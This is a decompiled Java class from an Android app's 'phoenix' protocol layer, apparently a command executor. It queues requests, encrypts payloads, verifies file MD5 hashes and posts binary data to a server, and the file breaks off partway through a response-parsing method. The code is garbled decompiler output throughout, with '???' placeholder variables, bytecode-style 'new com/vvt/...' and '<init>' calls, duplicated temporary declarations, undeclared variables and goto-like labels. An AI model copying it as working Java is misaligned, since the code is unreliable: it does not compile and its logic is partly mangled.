package com.vvt.phoenix.prot;

import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.Message;
import com.vvt.async.NullListenerException;
import com.vvt.http.request.ContentType;
import com.vvt.http.request.MethodType;
import com.vvt.phoenix.prot.command.a.s;
import com.vvt.phoenix.prot.command.a.u;
import com.vvt.phoenix.prot.databuilder.PayloadType;
import com.vvt.phoenix.prot.databuilder.ap;
import com.vvt.phoenix.prot.databuilder.t;
import com.vvt.phoenix.prot.databuilder.v;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.GeneralSecurityException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.concurrent.PriorityBlockingQueue;
import javax.crypto.SecretKey;

class e
  extends HandlerThread
  implements com.vvt.http.d
{
  private Handler b;
  private g c;
  
  public e(c paramc)
  {
    this(paramc, "PhoenixCommandExecutor", 10);
  }
  
  public e(c paramc, String paramString, int paramInt)
  {
    super(paramString, paramInt);
    start();
    Object localObject = new com/vvt/phoenix/prot/f;
    Looper localLooper = getLooper();
    ((f)localObject).<init>(this, localLooper, paramc);
    this.b = ((Handler)localObject);
    localObject = new com/vvt/phoenix/prot/g;
    ((g)localObject).<init>(this, null);
    this.c = ((g)localObject);
    this.c.a();
  }
  
  private void a(int paramInt)
  {
    Message localMessage = this.b.obtainMessage();
    localMessage.what = paramInt;
    localMessage.sendToTarget();
  }
  
  private void a(com.vvt.http.request.b paramb, int paramInt, byte[] paramArrayOfByte, ArrayList paramArrayList)
  {
    int i = 0;
    int j = 1;
    float f1 = Float.MIN_VALUE;
    int k = paramArrayOfByte.length;
    float f2;
    int m;
    float f3;
    label42:
    Object localObject1;
    Object localObject2;
    if (paramInt < k)
    {
      paramb.a(paramArrayOfByte, paramInt);
      k = j;
      f2 = f1;
      m = k;
      f3 = f2;
      k = paramArrayList.size();
      if (i >= k) {
        return;
      }
      localObject1 = (com.vvt.phoenix.prot.b.c)paramArrayList.get(i);
      if (m == 0) {
        break label150;
      }
      localObject2 = ((com.vvt.phoenix.prot.b.c)localObject1).a();
      paramb.a((byte[])localObject2);
      label86:
      if (m == 0) {
        break label213;
      }
      localObject1 = ((com.vvt.phoenix.prot.b.c)localObject1).b();
      paramb.a((String)localObject1);
      k = m;
      f2 = f3;
    }
    for (;;)
    {
      i += 1;
      m = k;
      f3 = f2;
      break label42;
      k = paramArrayOfByte.length;
      paramInt -= k;
      k = 0;
      localObject1 = null;
      f2 = 0.0F;
      break;
      label150:
      localObject2 = ((com.vvt.phoenix.prot.b.c)localObject1).a();
      int n = localObject2.length;
      if (paramInt < n)
      {
        byte[] arrayOfByte = ((com.vvt.phoenix.prot.b.c)localObject1).a();
        paramb.a(arrayOfByte, paramInt);
        m = j;
        f3 = f1;
        break label86;
      }
      localObject2 = ((com.vvt.phoenix.prot.b.c)localObject1).a();
      n = localObject2.length;
      paramInt -= n;
      break label86;
      label213:
      localObject2 = new java/io/File;
      String str = ((com.vvt.phoenix.prot.b.c)localObject1).b();
      ((File)localObject2).<init>(str);
      long l1 = paramInt;
      long l2 = ((File)localObject2).length();
      boolean bool = l1 < l2;
      if (bool)
      {
        localObject1 = ((com.vvt.phoenix.prot.b.c)localObject1).b();
        paramb.a((String)localObject1, paramInt);
        k = j;
        f2 = f1;
      }
      else
      {
        l1 = paramInt;
        l2 = ((File)localObject2).length();
        long l3 = l1 - l2;
        paramInt = (int)l3;
        k = m;
        f2 = f3;
      }
    }
  }
  
  private void a(com.vvt.phoenix.prot.c.c paramc)
  {
    i = 7;
    j = 2;
    k = 1;
    Object localObject1 = this.c;
    int m = 3;
    g.a((g)localObject1, m);
    localb = g.d(this.c).c();
    localObject1 = new com/vvt/phoenix/prot/databuilder/t;
    ((t)localObject1).<init>();
    for (;;)
    {
      try
      {
        g localg = this.c;
        localObject2 = localb.b();
        localObject3 = localb.c();
        localObject4 = this.c;
        localObject4 = g.d((g)localObject4);
        localObject4 = ((h)localObject4).b();
        localObject5 = paramc.b();
        l1 = paramc.a();
        Object localObject6 = this.c;
        localObject6 = g.d((g)localObject6);
        int n = ((h)localObject6).f();
        localObject1 = ((t)localObject1).a((com.vvt.phoenix.prot.command.c)localObject2, (com.vvt.phoenix.prot.command.b)localObject3, (String)localObject4, (byte[])localObject5, l1, n);
        g.a(localg, (v)localObject1);
        localObject1 = localb.c();
        int i1 = ((com.vvt.phoenix.prot.command.b)localObject1).a();
        m = 9;
        if (i1 != m)
        {
          m = 40;
          if (i1 != m) {}
        }
        else
        {
          localObject1 = this.c;
          m = 1;
          g.b((g)localObject1, m);
        }
        localObject1 = this.c;
        localObject1 = g.c((g)localObject1);
        if (localObject1 == null) {
          continue;
        }
        localObject1 = this.c;
        localObject1 = g.c((g)localObject1);
        long l2 = paramc.a();
        ((com.vvt.phoenix.prot.b.a)localObject1).b(l2);
        localObject1 = this.c;
        localObject1 = g.c((g)localObject1);
        localObject2 = paramc.b();
        ((com.vvt.phoenix.prot.b.a)localObject1).a((byte[])localObject2);
        localObject1 = this.c;
        localObject1 = g.c((g)localObject1);
        localObject2 = this.c;
        localObject2 = g.e((g)localObject2);
        localObject2 = ((v)localObject2).d();
        localObject2 = ((SecretKey)localObject2).getEncoded();
        ((com.vvt.phoenix.prot.b.a)localObject1).b((byte[])localObject2);
        localObject1 = this.c;
        localObject1 = g.c((g)localObject1);
        localObject2 = localb.b();
        ((com.vvt.phoenix.prot.b.a)localObject1).a((com.vvt.phoenix.prot.command.c)localObject2);
        localObject1 = this.c;
        localObject1 = g.c((g)localObject1);
        localObject2 = this.c;
        localObject2 = g.e((g)localObject2);
        l2 = ((v)localObject2).e();
        ((com.vvt.phoenix.prot.b.a)localObject1).c(l2);
        localObject1 = this.c;
        localObject1 = g.c((g)localObject1);
        localObject2 = this.c;
        localObject2 = g.e((g)localObject2);
        l2 = ((v)localObject2).f();
        ((com.vvt.phoenix.prot.b.a)localObject1).d(l2);
        localObject1 = this.c;
        localObject1 = g.c((g)localObject1);
        boolean bool1 = true;
        ((com.vvt.phoenix.prot.b.a)localObject1).a(bool1);
        localObject1 = this.c;
        localObject1 = g.e((g)localObject1);
        localObject1 = ((v)localObject1).a();
        localObject2 = PayloadType.VIRTUAL;
        if (localObject1 == localObject2)
        {
          localObject1 = this.c;
          localObject1 = g.c((g)localObject1);
          bool1 = true;
          ((com.vvt.phoenix.prot.b.a)localObject1).b(bool1);
          localObject1 = this.c;
          localObject2 = g.c((g)localObject1);
          localObject1 = this.c;
          localObject1 = g.e((g)localObject1);
          localObject1 = (ap)localObject1;
          localObject1 = ((ap)localObject1).b();
          ((com.vvt.phoenix.prot.b.a)localObject2).c((byte[])localObject1);
          localObject1 = this.c;
          localObject2 = g.c((g)localObject1);
          localObject1 = this.c;
          localObject1 = g.e((g)localObject1);
          localObject1 = (ap)localObject1;
          localObject1 = ((ap)localObject1).g();
          ((com.vvt.phoenix.prot.b.a)localObject2).a((ArrayList)localObject1);
        }
        localObject1 = c.d();
        localObject2 = this.c;
        localObject2 = g.c((g)localObject2);
        bool2 = ((com.vvt.phoenix.prot.b.b)localObject1).b((com.vvt.phoenix.prot.b.a)localObject2);
        if (bool2)
        {
          i();
          return;
        }
      }
      catch (Exception localException)
      {
        long l1;
        boolean bool2;
        int i2;
        int i3;
        int i4;
        Object localObject7;
        String str;
        Object localObject2 = localb.d();
        if (localObject2 == null) {
          continue;
        }
        Object localObject3 = this.a;
        Object localObject4 = new Object[j];
        long l3 = g.d(this.c).e();
        Object localObject5 = Long.valueOf(l3);
        localObject4[0] = localObject5;
        localObject4[k] = localException;
        c.c((c)localObject3, localObject2, i, (Object[])localObject4);
        a(false);
        continue;
        i();
        continue;
      }
      localObject1 = localb.d();
      if (localObject1 != null)
      {
        localObject2 = this.a;
        i2 = 7;
        i3 = 2;
        localObject4 = new Object[i3];
        i4 = 0;
        localObject5 = null;
        localObject7 = this.c;
        localObject7 = g.d((g)localObject7);
        l1 = ((h)localObject7).e();
        localObject7 = Long.valueOf(l1);
        localObject4[0] = localObject7;
        i4 = 1;
        localObject7 = new java/lang/Exception;
        str = "Cannot update session database";
        ((Exception)localObject7).<init>(str);
        localObject4[i4] = localObject7;
        c.b((c)localObject2, localObject1, i2, (Object[])localObject4);
      }
      bool2 = false;
      localObject1 = null;
      a(false);
    }
  }
  
  private void a(s params)
  {
    int i = 1;
    Object localObject = this.c;
    int j = 6;
    g.a((g)localObject, j);
    int k = params.e();
    a locala;
    int m;
    Object[] arrayOfObject;
    if (k == 0)
    {
      localObject = g.f(this.c);
      if (localObject != null)
      {
        localObject = this.a;
        locala = g.f(this.c);
        m = 4;
        arrayOfObject = new Object[i];
        arrayOfObject[0] = params;
        c.w((c)localObject, locala, m, arrayOfObject);
      }
      k = i;
      if (k == 0) {
        break label160;
      }
      a(i);
    }
    for (;;)
    {
      return;
      localObject = g.f(this.c);
      if (localObject != null)
      {
        localObject = this.a;
        locala = g.f(this.c);
        m = 3;
        arrayOfObject = new Object[i];
        arrayOfObject[0] = params;
        c.x((c)localObject, locala, m, arrayOfObject);
      }
      k = params.e();
      boolean bool = b(k);
      break;
      label160:
      c();
    }
  }
  
  private void a(boolean paramBoolean)
  {
    int i = 1;
    Object localObject1 = null;
    Object localObject2 = this.c;
    int j = 7;
    g.a((g)localObject2, j);
    localObject2 = this.c;
    boolean bool1 = g.g((g)localObject2);
    Object localObject3;
    if (bool1)
    {
      localObject2 = g.e(this.c);
      if (localObject2 != null)
      {
        localObject2 = g.d(this.c);
        if (localObject2 != null)
        {
          localObject2 = g.d(this.c);
          int k = ((h)localObject2).f();
          if (k != i) {
            break label436;
          }
          localObject2 = g.e(this.c).a();
          localObject3 = PayloadType.FILE;
          if (localObject2 != localObject3) {
            break label436;
          }
          localObject2 = new java/io/File;
          localObject3 = g.d(this.c).b();
          ((File)localObject2).<init>((String)localObject3);
        }
      }
    }
    for (;;)
    {
      if (localObject2 != null)
      {
        bool2 = ((File)localObject2).delete();
        if (!bool2) {}
      }
      localObject2 = g.c(this.c);
      if (localObject2 != null)
      {
        localObject2 = c.d();
        localObject3 = g.c(this.c);
        long l1 = ((com.vvt.phoenix.prot.b.a)localObject3).a();
        bool2 = ((com.vvt.phoenix.prot.b.b)localObject2).b(l1);
        if (!bool2) {}
      }
      if (paramBoolean)
      {
        localObject2 = this.c;
        bool2 = g.g((g)localObject2);
        if (!bool2) {
          break label369;
        }
        localObject2 = g.d(this.c);
        if (localObject2 == null) {
          break label369;
        }
        localObject3 = g.d(this.c).c().b().e();
        localObject1 = g.d(this.c).c().b().c();
        localObject2 = com.vvt.phoenix.a.c.a((String)localObject1);
      }
      for (;;)
      {
        com.vvt.phoenix.prot.c.e locale = new com/vvt/phoenix/prot/c/e;
        String str = c.e();
        locale.<init>(str, (String)localObject3, (String)localObject2, (String)localObject1);
        localObject1 = this.c;
        long l2 = g.n((g)localObject1);
        locale.a(i, l2);
        c();
        return;
        localObject2 = g.c(this.c);
        if (localObject2 == null) {
          break label436;
        }
        localObject2 = new java/io/File;
        localObject3 = g.c(this.c).c();
        ((File)localObject2).<init>((String)localObject3);
        break;
        label369:
        localObject2 = g.c(this.c);
        if (localObject2 != null)
        {
          localObject3 = g.c(this.c).d().e();
          localObject1 = g.c(this.c).d().c();
          localObject2 = com.vvt.phoenix.a.c.a((String)localObject1);
        }
        else
        {
          bool2 = false;
          localObject2 = null;
          j = 0;
          localObject3 = null;
        }
      }
      label436:
      boolean bool2 = false;
      localObject2 = null;
    }
  }
  
  private boolean b(int paramInt)
  {
    boolean bool = false;
    switch (paramInt)
    {
    default: 
      bool = true;
    }
    return bool;
  }
  
  private void c()
  {
    int i = 1;
    Object localObject1 = this.c;
    g.a((g)localObject1, i);
    for (;;)
    {
      synchronized (this.a)
      {
        localObject1 = this.c;
        ((g)localObject1).a();
        localObject1 = this.c;
        j = 1;
        g.a((g)localObject1, j);
        localObject1 = c.c();
        localObject1 = ((PriorityBlockingQueue)localObject1).poll();
        localObject1 = (l)localObject1;
        if (localObject1 == null)
        {
          localObject5 = this.c;
          ((g)localObject5).a();
          localObject5 = this.a;
          c.a((c)localObject5);
        }
        int k;
        if (localObject1 != null) {
          k = ((l)localObject1).a();
        }
        switch (k)
        {
        default: 
          return;
        }
      }
      g.a(this.c, i);
      Object localObject3 = (h)localObject2;
      g.a(this.c, (h)localObject3);
      ??? = this.c;
      Object localObject5 = ((h)localObject3).c().d();
      g.a((g)???, (a)localObject5);
      ??? = this.c;
      long l1 = ((h)localObject3).e();
      g.a((g)???, l1);
      localObject3 = ((h)localObject3).c().c();
      boolean bool = localObject3 instanceof com.vvt.phoenix.prot.command.r;
      if (bool) {
        d();
      }
      e();
      continue;
      ??? = this.c;
      int j = 0;
      g.a((g)???, false);
      localObject3 = (n)localObject3;
      g.a(this.c, (n)localObject3);
      ??? = this.c;
      localObject5 = ((n)localObject3).c();
      g.a((g)???, (com.vvt.phoenix.prot.b.a)localObject5);
      ??? = this.c;
      localObject5 = ((n)localObject3).b();
      g.a((g)???, (a)localObject5);
      ??? = this.c;
      l1 = ((n)localObject3).e();
      g.a((g)???, l1);
      localObject3 = this.c;
      ??? = g.c(this.c);
      long l2 = ((com.vvt.phoenix.prot.b.a)???).b();
      g.b((g)localObject3, l2);
      localObject3 = g.c(this.c);
      bool = ((com.vvt.phoenix.prot.b.a)localObject3).j();
      if (bool) {
        f();
      } else {
        g();
      }
    }
  }
  
  private void d()
  {
    Object localObject1 = this.c;
    int i = 11;
    g.a((g)localObject1, i);
    localObject1 = this.c;
    Object localObject2 = c.d();
    Object localObject3 = g.d(this.c);
    long l = ((h)localObject3).e();
    localObject2 = ((com.vvt.phoenix.prot.b.b)localObject2).a(l);
    g.a((g)localObject1, (com.vvt.phoenix.prot.b.a)localObject2);
    localObject1 = g.c(this.c);
    if (localObject1 != null) {}
    localObject1 = g.d(this.c).c();
    localObject2 = g.d(this.c).c().b();
    localObject3 = ((com.vvt.phoenix.prot.command.c)localObject2).e();
    localObject2 = ((com.vvt.phoenix.prot.command.c)localObject2).c();
    String str1 = com.vvt.phoenix.a.c.a((String)localObject2);
    Object localObject4 = ((b)localObject1).c();
    boolean bool = localObject4 instanceof com.vvt.phoenix.prot.command.r;
    if (bool)
    {
      com.vvt.phoenix.prot.command.a locala = ((com.vvt.phoenix.prot.command.r)((b)localObject1).c()).d();
      localObject1 = new com/vvt/phoenix/prot/c/e;
      localObject4 = c.e();
      ((com.vvt.phoenix.prot.c.e)localObject1).<init>((String)localObject4, (String)localObject3, str1, (String)localObject2);
      c localc = this.a;
      i = 1;
      int j = locala.a();
      str1 = locala.c();
      localObject4 = locala.d();
      String str2 = locala.e();
      int k = locala.b();
      localObject1 = ((com.vvt.phoenix.prot.c.e)localObject1).a(i, j, str1, (String)localObject4, str2, k);
      c.a(localc, (com.vvt.phoenix.prot.c.b)localObject1);
    }
  }
  
  private void e()
  {
    int i = 1;
    int j = 2;
    g.a(this.c, j);
    Object localObject1 = this.c;
    Object localObject2 = c.d();
    Object localObject3 = g.d(this.c);
    long l1 = ((h)localObject3).e();
    localObject2 = ((com.vvt.phoenix.prot.b.b)localObject2).a(l1);
    g.a((g)localObject1, (com.vvt.phoenix.prot.b.a)localObject2);
    localObject1 = g.c(this.c);
    if (localObject1 != null) {}
    localObject1 = g.d(this.c).c();
    localObject2 = g.d(this.c).c().b();
    localObject3 = ((com.vvt.phoenix.prot.command.c)localObject2).e();
    localObject2 = ((com.vvt.phoenix.prot.command.c)localObject2).c();
    String str = com.vvt.phoenix.a.c.a((String)localObject2);
    Object localObject4 = new com/vvt/phoenix/prot/c/e;
    Object localObject5 = c.e();
    ((com.vvt.phoenix.prot.c.e)localObject4).<init>((String)localObject5, (String)localObject3, str, (String)localObject2);
    localObject2 = ((com.vvt.phoenix.prot.c.e)localObject4).a(j, i);
    boolean bool1 = ((com.vvt.phoenix.prot.c.c)localObject2).d();
    if (!bool1)
    {
      localObject1 = ((b)localObject1).d();
      if (localObject1 != null)
      {
        localObject3 = this.a;
        int k = 6;
        localObject4 = new Object[j];
        long l2 = g.d(this.c).e();
        Long localLong = Long.valueOf(l2);
        localObject4[0] = localLong;
        localObject5 = new java/lang/Exception;
        localObject2 = ((com.vvt.phoenix.prot.c.c)localObject2).e();
        ((Exception)localObject5).<init>((String)localObject2);
        localObject4[i] = localObject5;
        c.a((c)localObject3, localObject1, k, (Object[])localObject4);
      }
      localObject1 = g.c(this.c);
      if (localObject1 != null)
      {
        localObject1 = c.d();
        localObject2 = g.c(this.c);
        long l3 = ((com.vvt.phoenix.prot.b.a)localObject2).a();
        boolean bool2 = ((com.vvt.phoenix.prot.b.b)localObject1).b(l3);
        if (bool2) {}
      }
      c();
    }
    for (;;)
    {
      return;
      localObject1 = this.c;
      l1 = ((com.vvt.phoenix.prot.c.c)localObject2).a();
      g.b((g)localObject1, l1);
      a((com.vvt.phoenix.prot.c.c)localObject2);
    }
  }
  
  private void f()
  {
    int i = 5;
    int j = 2;
    int k = 1;
    g.a(this.c, 10);
    Object localObject1 = g.c(this.c);
    Object localObject2 = ((com.vvt.phoenix.prot.b.a)localObject1).l();
    int m = 0;
    Object localObject3 = null;
    int n = ((ArrayList)localObject2).size();
    Object localObject4;
    Object localObject5;
    boolean bool;
    if (m < n)
    {
      localObject1 = (com.vvt.phoenix.prot.b.c)((ArrayList)localObject2).get(m);
      localObject4 = new java/io/File;
      localObject5 = ((com.vvt.phoenix.prot.b.c)localObject1).b();
      ((File)localObject4).<init>((String)localObject5);
      bool = ((File)localObject4).exists();
      if (!bool) {}
    }
    for (;;)
    {
      long l;
      String str2;
      Object[] arrayOfObject;
      try
      {
        localObject4 = ((com.vvt.phoenix.prot.b.c)localObject1).b();
        localObject4 = com.vvt.u.a.a((String)localObject4);
        localObject5 = ((com.vvt.phoenix.prot.b.c)localObject1).c();
        bool = MessageDigest.isEqual((byte[])localObject5, (byte[])localObject4);
        if (bool == k)
        {
          n = m + 1;
          m = n;
        }
      }
      catch (NoSuchAlgorithmException localNoSuchAlgorithmException)
      {
        localObject3 = g.f(this.c);
        if (localObject3 != null)
        {
          localObject3 = this.a;
          localObject2 = g.f(this.c);
          localObject4 = new Object[j];
          l = g.b(this.c);
          localObject5 = Long.valueOf(l);
          localObject4[0] = localObject5;
          localObject4[k] = localNoSuchAlgorithmException;
          c.d((c)localObject3, localObject2, i, (Object[])localObject4);
        }
        n = k;
        if (n == 0) {
          break label562;
        }
        a(false);
        return;
      }
      catch (IOException localIOException)
      {
        localObject3 = g.f(this.c);
        if (localObject3 != null)
        {
          localObject3 = this.a;
          localObject2 = g.f(this.c);
          localObject4 = new Object[j];
          l = g.b(this.c);
          localObject5 = Long.valueOf(l);
          localObject4[0] = localObject5;
          localObject4[k] = localIOException;
          c.e((c)localObject3, localObject2, i, (Object[])localObject4);
        }
        n = k;
        continue;
        localObject3 = g.f(this.c);
        if (localObject3 != null)
        {
          localObject3 = this.a;
          localObject2 = g.f(this.c);
          localObject4 = new Object[j];
          l = g.b(this.c);
          localObject5 = Long.valueOf(l);
          localObject4[0] = localObject5;
          localObject5 = new java/lang/Exception;
          str2 = "MD5 value of file %s is invalid";
          arrayOfObject = new Object[k];
          str1 = localIOException.b();
          arrayOfObject[0] = str1;
          str1 = String.format(str2, arrayOfObject);
          ((Exception)localObject5).<init>(str1);
          localObject4[k] = localObject5;
          c.f((c)localObject3, localObject2, i, (Object[])localObject4);
        }
        n = k;
        continue;
      }
      localObject3 = g.f(this.c);
      if (localObject3 != null)
      {
        localObject3 = this.a;
        localObject2 = g.f(this.c);
        localObject4 = new Object[j];
        l = g.b(this.c);
        localObject5 = Long.valueOf(l);
        localObject4[0] = localObject5;
        localObject5 = new java/lang/Exception;
        str2 = "File %s does not exist";
        arrayOfObject = new Object[k];
        str1 = str1.b();
        arrayOfObject[0] = str1;
        str1 = String.format(str2, arrayOfObject);
        ((Exception)localObject5).<init>(str1);
        localObject4[k] = localObject5;
        c.g((c)localObject3, localObject2, i, (Object[])localObject4);
      }
      n = k;
      continue;
      label562:
      g();
      continue;
      n = 0;
      String str1 = null;
    }
  }
  
  private void g()
  {
    int i = 2;
    boolean bool1 = true;
    Object localObject1 = this.c;
    int j = 8;
    g.a((g)localObject1, j);
    localObject1 = new com/vvt/phoenix/prot/i;
    Object localObject2 = g.c(this.c);
    Object localObject3 = c.f();
    ((i)localObject1).<init>((com.vvt.phoenix.prot.b.a)localObject2, (String)localObject3);
    localObject1 = ((i)localObject1).a();
    Object localObject5;
    if (localObject1 == null)
    {
      localObject1 = g.f(this.c);
      if (localObject1 != null)
      {
        localObject1 = this.a;
        localObject2 = g.f(this.c);
        localObject3 = new Object[i];
        long l1 = g.b(this.c);
        Object localObject4 = Long.valueOf(l1);
        localObject3[0] = localObject4;
        localObject4 = new java/lang/Exception;
        localObject5 = "Cannot make RAsk request";
        ((Exception)localObject4).<init>((String)localObject5);
        localObject3[bool1] = localObject4;
        c.h((c)localObject1, localObject2, i, (Object[])localObject3);
      }
      c();
    }
    for (;;)
    {
      return;
      j = ((com.vvt.phoenix.prot.command.a.r)localObject1).e();
      if (j != 0)
      {
        localObject2 = g.f(this.c);
        if (localObject2 != null)
        {
          localObject2 = this.a;
          localObject3 = g.f(this.c);
          int k = 3;
          localObject5 = new Object[bool1];
          localObject5[0] = localObject1;
          c.i((c)localObject2, localObject3, k, (Object[])localObject5);
        }
        int m = ((com.vvt.phoenix.prot.command.a.r)localObject1).e();
        boolean bool2 = b(m);
        if (bool2) {
          a(bool1);
        } else {
          c();
        }
      }
      else
      {
        localObject2 = this.c;
        long l2 = ((com.vvt.phoenix.prot.command.a.r)localObject1).b();
        int n = (int)l2;
        g.b((g)localObject2, n);
        h();
      }
    }
  }
  
  private void h()
  {
    int i = 2;
    Object localObject1 = this.c;
    int j = 9;
    g.a((g)localObject1, j);
    localObject1 = new com/vvt/phoenix/prot/databuilder/t;
    ((t)localObject1).<init>();
    try
    {
      localObject2 = this.c;
      localObject3 = this.c;
      localObject3 = g.c((g)localObject3);
      localObject1 = ((t)localObject1).a((com.vvt.phoenix.prot.b.a)localObject3);
      g.a((g)localObject2, (v)localObject1);
      i();
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject3;
        Object localObject2 = g.f(this.c);
        if (localObject2 != null)
        {
          localObject2 = this.a;
          localObject3 = g.f(this.c);
          Object[] arrayOfObject = new Object[i];
          long l = g.b(this.c);
          Long localLong = Long.valueOf(l);
          arrayOfObject[0] = localLong;
          int k = 1;
          arrayOfObject[k] = localException;
          c.j((c)localObject2, localObject3, i, arrayOfObject);
        }
        c();
      }
    }
  }
  
  private void i()
  {
    Object localObject1 = this.c;
    int i = 4;
    g.a((g)localObject1, i);
    com.vvt.http.request.b localb = new com/vvt/http/request/b;
    localb.<init>();
    localb.a(120000);
    localObject1 = ContentType.BINARY_OCTET_STREAM;
    localb.a((ContentType)localObject1);
    localObject1 = MethodType.POST;
    localb.a((MethodType)localObject1);
    localObject1 = c.f();
    localb.b((String)localObject1);
    localObject1 = g.e(this.c).c();
    localb.a((byte[])localObject1);
    localObject1 = this.c;
    boolean bool = g.g((g)localObject1);
    Object localObject2;
    Object localObject3;
    if (bool)
    {
      localObject2 = g.d(this.c).c().b().e();
      localObject1 = g.d(this.c).c().b().c();
      localObject3 = com.vvt.phoenix.a.c.a((String)localObject1);
      localb.c((String)localObject2);
      localb.d((String)localObject3);
      localb.e((String)localObject1);
      localObject1 = g.e(this.c).a();
      localObject3 = PayloadType.FILE;
      if (localObject1 != localObject3) {
        break label381;
      }
      localObject1 = this.c;
      bool = g.g((g)localObject1);
      if (!bool) {
        break label346;
      }
      localObject1 = ((com.vvt.phoenix.prot.databuilder.d)g.e(this.c)).b();
      localb.a((String)localObject1);
      label202:
      localObject1 = this.c;
      bool = g.j((g)localObject1);
      if (!bool) {
        break label582;
      }
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject3 = g.d(this.c).b();
      localObject1 = (String)localObject3 + ".httpBuffer";
      localObject3 = this.c;
      g.a((g)localObject3, (String)localObject1);
    }
    for (;;)
    {
      localObject1 = this.a;
      localObject3 = new com/vvt/http/a;
      ((com.vvt.http.a)localObject3).<init>();
      ((c)localObject1).a = ((com.vvt.http.a)localObject3);
      this.a.a.a(localb, this);
      return;
      localObject2 = g.h(this.c).c().d().e();
      localObject1 = g.h(this.c).c().d().c();
      localObject3 = com.vvt.phoenix.a.c.a((String)localObject1);
      break;
      label346:
      localObject1 = ((com.vvt.phoenix.prot.databuilder.d)g.e(this.c)).b();
      localObject3 = this.c;
      i = g.i((g)localObject3);
      localb.a((String)localObject1, i);
      break label202;
      label381:
      localObject1 = g.e(this.c).a();
      localObject3 = PayloadType.VIRTUAL;
      if (localObject1 == localObject3)
      {
        localObject1 = this.c;
        bool = g.g((g)localObject1);
        if (bool)
        {
          localObject1 = (ap)g.e(this.c);
          localObject3 = ((ap)localObject1).b();
          localb.a((byte[])localObject3);
          localObject2 = ((ap)localObject1).g();
          bool = false;
          localObject1 = null;
          i = 0;
          localObject3 = null;
          for (;;)
          {
            int j = ((ArrayList)localObject2).size();
            if (i >= j) {
              break;
            }
            localObject1 = (com.vvt.phoenix.prot.b.c)((ArrayList)localObject2).get(i);
            byte[] arrayOfByte = ((com.vvt.phoenix.prot.b.c)localObject1).a();
            localb.a(arrayOfByte);
            localObject1 = ((com.vvt.phoenix.prot.b.c)localObject1).b();
            localb.a((String)localObject1);
            j = i + 1;
            i = j;
          }
        }
        localObject1 = (ap)g.e(this.c);
        localObject3 = this.c;
        i = g.i((g)localObject3);
        localObject2 = ((ap)localObject1).b();
        localObject1 = ((ap)localObject1).g();
        a(localb, i, (byte[])localObject2, (ArrayList)localObject1);
        break label202;
      }
      localObject1 = ((com.vvt.phoenix.prot.databuilder.b)g.e(this.c)).b();
      localb.a((byte[])localObject1);
      break label202;
      label582:
      localObject1 = this.c;
      localObject3 = new java/io/ByteArrayOutputStream;
      ((ByteArrayOutputStream)localObject3).<init>();
      g.a((g)localObject1, (OutputStream)localObject3);
    }
  }
  
  private void j()
  {
    int i = 4;
    int j = 1;
    int k = 2;
    Object localObject1 = this.c;
    int m = 5;
    g.a((g)localObject1, m);
    localObject1 = this.c;
    boolean bool2 = g.j((g)localObject1);
    if (bool2) {}
    for (;;)
    {
      Object localObject5;
      Object localObject6;
      long l2;
      Object localObject7;
      try
      {
        localObject1 = this.c;
        bool2 = g.m((g)localObject1);
        localObject4 = this.c;
        localObject4 = g.l((g)localObject4);
        localObject5 = this.c;
        localObject5 = g.e((g)localObject5);
        localObject5 = ((v)localObject5).d();
        localObject1 = m.a(bool2, (String)localObject4, (SecretKey)localObject5);
        localObject4 = this.c;
        long l1 = g.b((g)localObject4);
        ((s)localObject1).b(l1);
        a((s)localObject1);
        return;
      }
      catch (FileNotFoundException localFileNotFoundException)
      {
        localObject4 = new java/io/File;
        localObject5 = g.l(this.c);
        ((File)localObject4).<init>((String)localObject5);
        ((File)localObject4).delete();
        localObject4 = g.f(this.c);
        if (localObject4 != null)
        {
          localObject4 = this.a;
          localObject5 = g.f(this.c);
          localObject6 = new Object[k];
          l2 = g.b(this.c);
          localObject7 = Long.valueOf(l2);
          localObject6[0] = localObject7;
          localObject6[j] = localFileNotFoundException;
          c.p((c)localObject4, localObject5, k, (Object[])localObject6);
        }
        c();
        continue;
      }
      catch (IOException localIOException1)
      {
        localObject4 = new java/io/File;
        localObject5 = g.l(this.c);
        ((File)localObject4).<init>((String)localObject5);
        ((File)localObject4).delete();
        localObject4 = g.f(this.c);
        if (localObject4 != null)
        {
          localObject4 = this.a;
          localObject5 = g.f(this.c);
          localObject6 = new Object[k];
          l2 = g.b(this.c);
          localObject7 = Long.valueOf(l2);
          localObject6[0] = localObject7;
          localObject6[j] = localIOException1;
          c.q((c)localObject4, localObject5, k, (Object[])localObject6);
        }
        c();
        continue;
      }
      catch (Exception localException)
      {
        localObject4 = new java/io/File;
        localObject5 = g.l(this.c);
        ((File)localObject4).<init>((String)localObject5);
        ((File)localObject4).delete();
        localObject4 = g.f(this.c);
        if (localObject4 != null)
        {
          localObject4 = this.a;
          localObject5 = g.f(this.c);
          localObject6 = new Object[k];
          l2 = g.b(this.c);
          localObject7 = Long.valueOf(l2);
          localObject6[0] = localObject7;
          localObject6[j] = localException;
          c.r((c)localObject4, localObject5, k, (Object[])localObject6);
        }
        c();
        continue;
      }
      Object localObject4 = ((ByteArrayOutputStream)g.k(this.c)).toByteArray();
      com.vvt.io.d.a(g.k(this.c));
      int i1 = localObject4[0];
      int n = localObject4.length + -1;
      Object localObject2 = new byte[n];
      int i2 = localObject2.length;
      System.arraycopy(localObject4, j, localObject2, 0, i2);
      if (i1 == j) {}
      long l3;
      try
      {
        localObject4 = this.c;
        localObject4 = g.e((g)localObject4);
        localObject4 = ((v)localObject4).d();
        localObject2 = com.vvt.l.a.b((SecretKey)localObject4, (byte[])localObject2);
        localObject4 = new java/io/ByteArrayInputStream;
        ((ByteArrayInputStream)localObject4).<init>((byte[])localObject2);
        i1 = 8;
        localObject5 = new byte[i1];
        Object tmp571_569 = localObject5;
        Object tmp572_571 = tmp571_569;
        Object tmp572_571 = tmp571_569;
        tmp572_571[0] = 0;
        tmp572_571[1] = 0;
        Object tmp579_572 = tmp572_571;
        Object tmp579_572 = tmp572_571;
        tmp579_572[2] = 0;
        tmp579_572[3] = 0;
        Object tmp586_579 = tmp579_572;
        Object tmp586_579 = tmp579_572;
        tmp586_579[4] = 0;
